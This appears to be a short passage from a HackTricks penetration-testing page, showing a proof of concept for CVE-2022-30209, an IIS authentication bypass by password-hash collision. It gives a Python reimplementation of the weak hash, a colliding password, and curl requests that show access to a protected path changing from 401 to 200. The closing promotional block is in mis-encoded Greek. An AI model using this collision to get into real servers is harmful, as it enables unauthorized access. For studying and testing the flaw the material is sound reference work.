![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
